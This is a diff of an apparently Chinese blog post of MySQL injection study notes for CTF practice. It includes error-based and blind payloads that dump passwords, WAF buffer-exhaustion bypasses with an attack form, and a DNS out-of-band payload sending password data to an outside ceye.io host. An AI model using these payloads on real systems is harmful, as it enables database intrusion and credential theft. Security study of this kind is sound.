@@ -99,7 +99,7 @@
 <meta property="og:url" content="https://someonesometimes.github.io/2017/07/23/mysql注入学习（持续更新中）/index.html">
 <meta property="og:site_name" content="Yiruma">
 <meta property="og:description" content="目前排版还比较乱，常见的姿势基本已经整理的比较全了，还在不断学习中。。。">
-<meta property="og:updated_time" content="2018-01-06T07:06:32.752Z">
+<meta property="og:updated_time" content="2018-01-27T10:21:14.061Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mysql注入学习（持续保持更新）">
 <meta name="twitter:description" content="目前排版还比较乱，常见的姿势基本已经整理的比较全了，还在不断学习中。。。">
@@ -372,13 +372,21 @@
 <h4 id="基于报错的盲注"><a href="#基于报错的盲注" class="headerlink" title="基于报错的盲注"></a>基于报错的盲注</h4><p><strong>需要注意的一点是，既然数据库会报错回显，本质上和只有两种回显的情况是有不同的，在精心构造的语句+低版本的数据库中是可能直接拿到数据而不用盲注的，有关于报错的分类以及直接拿数据的方法我们在后面都会介绍到，这里只是盲注中对基于报错的使用</strong></p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#利用函数传入参数的格式错误报错</div><div class="line">select 1 from users where user='' or [0/1] and ST_LatFromGeoHash(version())%23;</div><div class="line">#利用exp函数的运算溢出可以造成报错，从710开始就会报错了，~0，，~1等等也都是可以的</div><div class="line">select 1 from users where user='' or [0/1] or exp(~0)</div><div class="line">#利用支持运算的最大值构造报错，这里的0就是按位取反得到的最大值，也就是18446744073709551615</div><div class="line">select 1 from users where user='' or [0/1] or ~0+1</div></pre></td></tr></table></figure>
 <h3 id="盲注中可能用到的一些点"><a href="#盲注中可能用到的一些点" class="headerlink" title="盲注中可能用到的一些点"></a>盲注中可能用到的一些点</h3><ul>
-<li>group_concat()将一列数据整合</li>
-<li>获取数据库 <code>select database()</code></li>
-<li>获取数据库中的表<br><code>select group_concat(table_name) from information_schema.tables where table_schema = &#39;news&#39;</code></li>
-<li>获取表中的对应列<br><code>select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;</code> </li>
-<li>最要紧的就是 = ‘i’或是0x表示，经常在payload里面写成 = {}，应该是 = ‘{}’</li>
-<li>mysql的单字符比较中不区分大小写，应该使用binary()或者ascii()来区分大小写，测试ascii不管用，但是binary()可以。另外hex()函数用起来也很方便</li>
-<li>有一些很有意思的地方(从Ben师傅的一次padding oracle attack结合sql注入的时候在想：在对回车也就是%0a, \n 字符进行getcipher的时候，是写成%0a，还是\n呢？%0a的话，对应加密出三个字符，而\n这对应一个回车字符)：<br>在传递不可显示字符的时候，就比如回车符吧，我们有两种传递方式———将回车符用url编码，也就是写做%0a的形式，在到服务端接收的时候就会自动进行urldecode所以又是回车符了，这时候可能我们会想：在写php代码的时候，将回车符号写作\n  0x0a  \x0a啊这些也都可以在sql中正常运行，那么在作为参数传递时这样写行不行呢，其实是不行的，因为你传过去再输出就可以看到，这些符号的意义并没有被转化为回车符，而只是单纯的几个字符而已。<br>有一种情况特殊些，我们将字符串可以用0xxxxx来代替，但是这并不是在php里面能对0x进行解析为对应的字符，而是因为mysql支持这种字符串的书写格式。</li>
+<li><p>group_concat()将一列数据整合</p>
+</li>
+<li><p>获取数据库 <code>select database()</code></p>
+</li>
+<li><p>获取数据库中的表<br><code>select group_concat(table_name) from information_schema.tables where table_schema = &#39;news&#39;</code></p>
+</li>
+<li><p>获取表中的对应列<br><code>select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;</code> </p>
+</li>
+<li><p>最要紧的就是 = ‘i’或是0x表示，经常在payload里面写成 = {}，应该是 = ‘{}’</p>
+</li>
+<li><p>mysql的单字符比较中不区分大小写，应该使用binary()或者ascii()来区分大小写，测试ascii不管用，但是binary()可以。另外hex()函数用起来也很方便</p>
+<p>另外select * from user where username=’admin’ and binary password=’xxx’这里就已经对password字段进行了二进制处理</p>
+</li>
+<li><p>有一些很有意思的地方(从Ben师傅的一次padding oracle attack结合sql注入的时候在想：在对回车也就是%0a, \n 字符进行getcipher的时候，是写成%0a，还是\n呢？%0a的话，对应加密出三个字符，而\n这对应一个回车字符)：<br>在传递不可显示字符的时候，就比如回车符吧，我们有两种传递方式———将回车符用url编码，也就是写做%0a的形式，在到服务端接收的时候就会自动进行urldecode所以又是回车符了，这时候可能我们会想：在写php代码的时候，将回车符号写作\n  0x0a  \x0a啊这些也都可以在sql中正常运行，那么在作为参数传递时这样写行不行呢，其实是不行的，因为你传过去再输出就可以看到，这些符号的意义并没有被转化为回车符，而只是单纯的几个字符而已。<br>有一种情况特殊些，我们将字符串可以用0xxxxx来代替，但是这并不是在php里面能对0x进行解析为对应的字符，而是因为mysql支持这种字符串的书写格式。</p>
+</li>
 </ul>
 <h2 id="基于报错的注入-盲注部分前面提到了就不说了"><a href="#基于报错的注入-盲注部分前面提到了就不说了" class="headerlink" title="基于报错的注入(盲注部分前面提到了就不说了)"></a>基于报错的注入(盲注部分前面提到了就不说了)</h2><p><strong>首先来了解下如何从报错信息中直接拿到我们要的数据而不用盲注，之后在对报错注入的分类的介绍中我们会附加上如何不用盲注拿数据的payload</strong></p>
 <p>让我们从exp(~0)这个报错函数开始考虑，报错时显示</p>
@@ -424,13 +432,13 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">有时候可能爆不全，不全的时候用limit offset按行取吧</div><div class="line">有时候还容易出问题，尝试使用第二行的写法，将计算结果左右连接上~</div><div class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="number">1</span>);</div><div class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="number">0x7e</span>));</div><div class="line">output:</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: '~dd9d15d993d6f42f896ab4ba09a6a69</div></pre></td></tr></table></figure>
 <p><strong>基于主键重复的报错</strong></p>
 <p>是目前网上报错注入流传比较多的版本，好处是在高版本中依旧可以爆出错误，同时也没有使用updatexml函数报错限制报错长度为32的弊端</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from user where username='14' or (select count(*) from information_schema.tables group by concat(floor(rand(0)*2),(select password from user where username='admin')));</div><div class="line">output:</div><div class="line">ERROR 1062 (23000): Duplicate entry '16b9412ec641f16892544154952fc8b1d' for key '&lt;group_key&gt;'</div><div class="line">注意第一个数字1是要去掉的，为floor(rand(0)*2)的结果</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from user where username='14' or (select count(*) from information_schema.tables group by concat(floor(rand(0)*2),(select password from user where username='admin')));</div><div class="line">output:</div><div class="line">ERROR 1062 (23000): Duplicate entry '16b9412ec641f16892544154952fc8b1d' for key '&lt;group_key&gt;'</div><div class="line">注意第一个数字1是要去掉的，为floor(rand(0)*2)的结果</div><div class="line"></div><div class="line">select count(*) from information_schema.tables group by concat(floor(rand(0)*2),(select password from user where username='admin'))</div></pre></td></tr></table></figure>
 <p>原理分析：</p>
 <p>在一条语句<code>select count(*) from user group by username</code>中，数据库的操作是建立一个虚表，比起原表多了一个count()列，group by的那个列变成了主键也就是<code>&lt;group_key&gt;</code>，之后从user表中一条条的取出来数据，在虚表中查找，基于group_key（在这里就是username）的值在虚表中是否已经存在，来决定是在count()列中加1还是新添加一个列。  考虑这个过程，我们使用<code>floor(rand(0)*2)</code>作为<code>&lt;group_key&gt;</code>的话，我们每次从user表里面提出来一条数据准备依据group_key进行插入，第一次计算结果是0，group_key为0，第二次是1，group_key为0，这里都没问题，只是在虚表中多了两个列，一个列名1，一个列名0，第三次插入的时候计算结果为1，这时再准备往虚表中插入虚拟的主键1，就会报主键重复的错误。</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Duplicate entry '16b9412ec641f16892544154952fc8b1d' for key '&lt;group_key&gt;'</div></pre></td></tr></table></figure>
 <h2 id="sql过滤统计"><a href="#sql过滤统计" class="headerlink" title="sql过滤统计"></a>sql过滤统计</h2><p>反正过滤吧，不是想办法绕过，就是再找一个相同功能的写法来替换<br>先放上一些比较经典的：</p>
 <ul>
-<li><a href="https://xianzhi.aliyun.com/forum/read/349.html" target="_blank" rel="external">我的WafBypass之道</a></li>
+<li><a href="https://paper.seebug.org/218/" target="_blank" rel="external">我的WafBypass之道</a></li>
 </ul>
 <p><strong>过滤单引号</strong></p>
 <ul>
@@ -439,7 +447,7 @@
 </ul>
 <p><strong>过滤空格</strong><br>本质上就是用一些无法融入原写法语义的符号放到那里起到空格的分隔作用</p>
 <ul>
-<li>使用<code>()</code>来做分隔,形如select(*)from(user)的写法，</li>
+<li>使用<code>() 或者 反引号</code>来做分隔,形如select(*)from(user)的写法，</li>
 <li>sqlmap中space2hash.py的方法，用%23xxx%0a来做空格</li>
 <li>使用<code>/**/</code>来做分隔</li>
 <li>使用%0a来做分隔</li>
@@ -473,9 +481,19 @@
 <li>使用concat(‘adm’+’in’)就可以，但注意mysql中写成’adm’+’in’的结果是0。。。小心不要错了</li>
 <li>limit被禁用，也不能使用group_concat()，这时候就要使用where条件将查询结果限制在一行中，比如可以使用like方法</li>
 </ul>
+<p><strong>waf的缓冲区溢出利用</strong></p>
+<p>因为waf多是基于C语言编写的，所以如果输入的参数大于缓冲区的时候并不会报错而只是检查缓冲区内的部分，溢出的部分就不会进行检查</p>
+<p>这里提供两种思路：</p>
+<ul>
+<li><p>如果参数使用post上传，我们提交两个同名的参数，在php处理策略上，同名参数会以第二个为准，而waf可能会两个都进行处理，这样我们第一个参数提交一个文件来耗尽waf缓存，第二个参数就不会检查了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://xxx/xxx.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>    </div><div class="line">    file:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"username"</span> / &gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span>          </div><div class="line">    username:<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"payload"</span> <span class="attr">style</span>=<span class="string">"width:250px;"</span> / &gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span>           </div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"attack"</span> /&gt;</span>      </div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>我们把这个参数写的很长，比如经典的’ or xxx，我们在单引号之前填充很多的数据来耗尽waf的缓冲区，or后面的部分就不会被检测到了 ，比如aaa*1000’ or xxx</p>
+</li>
+</ul>
 <p><strong>其他</strong></p>
 <ul>
-<li><p>有个很有意思的点：过滤了union select from 却没有对单个关键字进行过滤。还是使用变量的方法，将数据存到变量里面，之后再用union select查询，这样就不会与from连起来了</p>
+<li><p>过滤了union select from 却没有对单个关键字进行过滤。还是使用变量的方法，将数据存到变量里面，之后再用union select查询，这样就不会与from连起来了</p>
 <p><code>select 1 from user where 2=3|@c:=(select flag from flag) union select @c;</code>这样最后就没有from了</p>
 </li>
 </ul>
@@ -523,6 +541,13 @@
 <p>payload: <code>SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT password FROM user),&#39;.a.wslhlk.ceye.io\\abc&#39;));</code></p>
 <p>在测试中可以看到，因为DNS缓存的原因，相同的域名不会第二次查询，所以建议每次更改a的值</p>
 <p>另外注意域名中只支持英文字母，数字，-，且-不能用作开头和结尾，且长度限制在了63，所以比较适合用于携带hash后的密码这些数据</p>
+<h2 id="只能拿当前表内的数据的情况分析"><a href="#只能拿当前表内的数据的情况分析" class="headerlink" title="只能拿当前表内的数据的情况分析"></a>只能拿当前表内的数据的情况分析</h2><p>有时候因为过滤比较严格，或是所要的数据就在本表内，我们使用的策略往往只能在当前表内查数据</p>
+<p>这种过滤往往是这样的：</p>
+<blockquote>
+<p>限制了select  或者 from，其实就从根本上限制了读取其他表的数据，除非有绕过的方法</p>
+</blockquote>
+<p>虽然不能读取其他的表，我们可能还是有办法读取本表的数据的，下面是几个例子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">select * from user where username=&apos;&apos;  参数禁止使用select</div><div class="line"></div><div class="line">策略一：   ————————经典的like注入</div><div class="line">select * from user where username=&apos;admin&apos; or binary password like &apos;xx%&apos;</div><div class="line">可以用来拿到username为admin的密码</div><div class="line">select * from user where username=&apos;xxx&apos; or 1 and binary password like &apos;flag&#123;%&apos;</div><div class="line">常对一个字段进行寻找，最后输出为username=&apos;xxx&apos;行,以及password like &apos;flag&#123;%&apos;行</div><div class="line"></div><div class="line">策略二：</div><div class="line">select * from user where username=&apos;admin&apos; or substr(password,1,2)=&apos;xx&apos;</div><div class="line"></div><div class="line">策略三：</div><div class="line">select password from user where user=&apos;admin&apos; union select [&apos;a&apos;|&apos;fe&apos;] order by 1;</div><div class="line">经典的order by比较注入，不能使用from，or and也被禁用时</div></pre></td></tr></table></figure>
 <h2 id="单引号转义下的注入思路整理"><a href="#单引号转义下的注入思路整理" class="headerlink" title="单引号转义下的注入思路整理"></a>单引号转义下的注入思路整理</h2><p>讲道理在单引号被转义而无法使用下，就基本GG了，但在一些特殊的配置下仍可能实现注入，在做题时也偶尔会碰到这些有意思的场景，把历来的思路做个记录。</p>
 <ul>
 <li><p>宽字节注入<code>%df%2f</code>，通过%df来吃掉\组成一个字符</p>
@@ -733,15 +758,6 @@
           
 
           
-            
-            
-            <div class="site-state-item site-state-tags">
-              
-                <span class="site-state-item-count">2</span>
-                <span class="site-state-item-name">标签</span>
-              
-            </div>
-          
 
         </nav>
 
@@ -779,7 +795,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql盲注"><span class="nav-number">1.</span> <span class="nav-text">sql盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一步：字符串截取函数"><span class="nav-number">1.1.</span> <span class="nav-text">第一步：字符串截取函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二步：将截取到的字符串段进行比较得到另一个数据"><span class="nav-number">1.2.</span> <span class="nav-text">第二步：将截取到的字符串段进行比较得到另一个数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三步：产生两种结果"><span class="nav-number">1.3.</span> <span class="nav-text">第三步：产生两种结果</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基于bool的盲注"><span class="nav-number">1.3.1.</span> <span class="nav-text">基于bool的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于time的盲注"><span class="nav-number">1.3.2.</span> <span class="nav-text">基于time的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于报错的盲注"><span class="nav-number">1.3.3.</span> <span class="nav-text">基于报错的盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#盲注中可能用到的一些点"><span class="nav-number">1.4.</span> <span class="nav-text">盲注中可能用到的一些点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于报错的注入-盲注部分前面提到了就不说了"><span class="nav-number">2.</span> <span class="nav-text">基于报错的注入(盲注部分前面提到了就不说了)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-7版本以上mysql函数"><span class="nav-number">2.1.</span> <span class="nav-text">5.7版本以上mysql函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#低版本报错方式"><span class="nav-number">2.2.</span> <span class="nav-text">低版本报错方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql过滤统计"><span class="nav-number">3.</span> <span class="nav-text">sql过滤统计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#报错注入得到表名列名以及不使用列名下的注入"><span class="nav-number">4.</span> <span class="nav-text">报错注入得到表名列名以及不使用列名下的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#首先是拿到数据库名"><span class="nav-number">4.0.1.</span> <span class="nav-text">首先是拿到数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#然后是拿表名"><span class="nav-number">4.0.2.</span> <span class="nav-text">然后是拿表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其实到这一步我们就可以直接拿数据了，有下面几种姿势可以在不使用列名的情况下拿到表里的数据"><span class="nav-number">4.0.3.</span> <span class="nav-text">其实到这一步我们就可以直接拿数据了，有下面几种姿势可以在不使用列名的情况下拿到表里的数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#最后再介绍下拿列名的做法"><span class="nav-number">4.0.4.</span> <span class="nav-text">最后再介绍下拿列名的做法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用Out-of-Band带外攻击来回显数据"><span class="nav-number">5.</span> <span class="nav-text">使用Out of Band带外攻击来回显数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#单引号转义下的注入思路整理"><span class="nav-number">6.</span> <span class="nav-text">单引号转义下的注入思路整理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#非常规的注入做法"><span class="nav-number">7.</span> <span class="nav-text">非常规的注入做法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#场景一"><span class="nav-number">7.0.1.</span> <span class="nav-text">场景一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景二"><span class="nav-number">7.0.2.</span> <span class="nav-text">场景二</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景三"><span class="nav-number">7.0.3.</span> <span class="nav-text">场景三</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景四"><span class="nav-number">7.0.4.</span> <span class="nav-text">场景四</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些零碎记录的点"><span class="nav-number">8.</span> <span class="nav-text">一些零碎记录的点</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql盲注"><span class="nav-number">1.</span> <span class="nav-text">sql盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一步：字符串截取函数"><span class="nav-number">1.1.</span> <span class="nav-text">第一步：字符串截取函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二步：将截取到的字符串段进行比较得到另一个数据"><span class="nav-number">1.2.</span> <span class="nav-text">第二步：将截取到的字符串段进行比较得到另一个数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三步：产生两种结果"><span class="nav-number">1.3.</span> <span class="nav-text">第三步：产生两种结果</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基于bool的盲注"><span class="nav-number">1.3.1.</span> <span class="nav-text">基于bool的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于time的盲注"><span class="nav-number">1.3.2.</span> <span class="nav-text">基于time的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于报错的盲注"><span class="nav-number">1.3.3.</span> <span class="nav-text">基于报错的盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#盲注中可能用到的一些点"><span class="nav-number">1.4.</span> <span class="nav-text">盲注中可能用到的一些点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于报错的注入-盲注部分前面提到了就不说了"><span class="nav-number">2.</span> <span class="nav-text">基于报错的注入(盲注部分前面提到了就不说了)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-7版本以上mysql函数"><span class="nav-number">2.1.</span> <span class="nav-text">5.7版本以上mysql函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#低版本报错方式"><span class="nav-number">2.2.</span> <span class="nav-text">低版本报错方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql过滤统计"><span class="nav-number">3.</span> <span class="nav-text">sql过滤统计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#报错注入得到表名列名以及不使用列名下的注入"><span class="nav-number">4.</span> <span class="nav-text">报错注入得到表名列名以及不使用列名下的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#首先是拿到数据库名"><span class="nav-number">4.0.1.</span> <span class="nav-text">首先是拿到数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#然后是拿表名"><span class="nav-number">4.0.2.</span> <span class="nav-text">然后是拿表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其实到这一步我们就可以直接拿数据了，有下面几种姿势可以在不使用列名的情况下拿到表里的数据"><span class="nav-number">4.0.3.</span> <span class="nav-text">其实到这一步我们就可以直接拿数据了，有下面几种姿势可以在不使用列名的情况下拿到表里的数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#最后再介绍下拿列名的做法"><span class="nav-number">4.0.4.</span> <span class="nav-text">最后再介绍下拿列名的做法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用Out-of-Band带外攻击来回显数据"><span class="nav-number">5.</span> <span class="nav-text">使用Out of Band带外攻击来回显数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#只能拿当前表内的数据的情况分析"><span class="nav-number">6.</span> <span class="nav-text">只能拿当前表内的数据的情况分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#单引号转义下的注入思路整理"><span class="nav-number">7.</span> <span class="nav-text">单引号转义下的注入思路整理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#非常规的注入做法"><span class="nav-number">8.</span> <span class="nav-text">非常规的注入做法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#场景一"><span class="nav-number">8.0.1.</span> <span class="nav-text">场景一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景二"><span class="nav-number">8.0.2.</span> <span class="nav-text">场景二</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景三"><span class="nav-number">8.0.3.</span> <span class="nav-text">场景三</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景四"><span class="nav-number">8.0.4.</span> <span class="nav-text">场景四</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些零碎记录的点"><span class="nav-number">9.</span> <span class="nav-text">一些零碎记录的点</span></a></li></ol></div>
             
 
           </div>
